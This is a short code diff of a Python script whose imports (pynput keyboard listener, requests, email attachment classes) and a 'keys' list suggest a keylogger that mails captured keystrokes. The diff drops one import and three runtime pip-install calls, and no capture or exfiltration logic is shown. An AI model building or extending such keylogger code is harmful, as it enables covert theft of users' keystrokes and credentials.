@@ -10,11 +10,7 @@ from datetime import datetime
 from requests import get
 from pynput.keyboard import Key, Listener
 from email.mime.multipart import MIMEMultipart 
-from email.mime.text import MIMEText 
 from email.mime.application import MIMEApplication
-subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
-subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil"])
-subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
 
 ## Initialise variables
 keys = []
